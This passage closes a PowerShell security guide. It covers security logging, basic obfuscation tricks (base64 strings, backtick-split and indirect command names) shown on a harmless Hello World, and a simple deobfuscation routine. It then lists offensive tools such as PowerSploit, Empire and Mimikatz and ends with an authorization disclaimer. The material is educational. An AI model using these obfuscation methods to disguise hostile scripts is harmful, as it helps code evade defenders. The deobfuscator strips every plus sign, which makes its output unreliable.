        'Timestamp' = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        'Level' = $Level
        'Message' = $Message
        'User' = $env:USERNAME
        'Computer' = $env:COMPUTERNAME
    }
    
    $LogEntry | ConvertTo-Json -Compress | Out-File -FilePath "C:\Logs\Security.log" -Append
}

# Usage examples
try {
    Secure-Function -UserInput "test123" -Action "Read" -MaxItems 5
    Write-SecurityLog -Message "Function executed successfully" -Level "Information"
} catch {
    Write-SecurityLog -Message "Function execution failed: $($_.Exception.Message)" -Level "Error"
}
```

### PowerShell Obfuscation and Deobfuscation

#### Basic Obfuscation Techniques
```powershell
# String obfuscation
$ObfuscatedString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACIA'))

# Command obfuscation
$ObfuscatedCommand = "W`r`it`e-`Ho`st"
& $ObfuscatedCommand "Hello World"

# Variable obfuscation
$a = 'Write-Host'
$b = 'Hello World'
& $a $b

# Deobfuscation techniques
function Deobfuscate-PowerShellScript {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ScriptPath
    )
    
    $Script = Get-Content -Path $ScriptPath -Raw
    
    # Decode base64 strings
    $Base64Pattern = '[A-Za-z0-9+/]{4,}={0,2}'
    $Base64Matches = [regex]::Matches($Script, $Base64Pattern)
    
    foreach ($Match in $Base64Matches) {
        try {
            $Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Match.Value))
            Write-Host "Base64 decoded: $Decoded"
        } catch {
            # Not valid base64
        }
    }
    
    # Remove backticks and other obfuscation
    $CleanScript = $Script -replace '`', ''
    $CleanScript = $CleanScript -replace '\+', ''
    
    return $CleanScript
}
```

---

## Resources

### Essential PowerShell Security Modules
- **PowerSploit**: PowerShell post-exploitation framework
- **Empire**: PowerShell and Python post-exploitation agent
- **Nishang**: PowerShell for offensive security
- **PowerUpSQL**: PowerShell toolkit for SQL Server attacks
- **PowerView**: Active Directory reconnaissance
- **Invoke-Obfuscation**: PowerShell obfuscation framework

### Documentation and Learning
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/security/overview)
- [PowerShell Execution Policies](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
- [PowerShell Security Features](https://docs.microsoft.com/en-us/powershell/scripting/security/security-features)
- [Windows PowerShell Logging](https://docs.microsoft.com/en-us/powershell/scripting/security/logging)

### Security Tools and Frameworks
- **BloodHound**: Active Directory reconnaissance
- **Cobalt Strike**: Commercial penetration testing framework
- **Metasploit**: Penetration testing platform
- **Mimikatz**: Windows credential extraction tool

---

## Conclusion

PowerShell is a powerful tool for both offensive and defensive security operations. This guide provides the foundation for using PowerShell effectively in cybersecurity contexts while maintaining security best practices.

Key takeaways:
- **Always validate input** and implement proper error handling
- **Use constrained language mode** for untrusted scripts
- **Implement comprehensive logging** for security events
- **Stay updated** with the latest security features and best practices
- **Follow the principle of least privilege** in all operations

---

*This guide is for educational and authorized security testing purposes only. Always ensure you have proper authorization before using these techniques.*

[![GitHub](https://img.shields.io/badge/GitHub-gotr00t0day-black?style=for-the-badge&logo=github)](https://github.com/gotr00t0day)
[![Website](https://img.shields.io/badge/Website-gotr00t0day.github.io-blue?style=for-the-badge&logo=web)](https://gotr00t0day.github.io) 
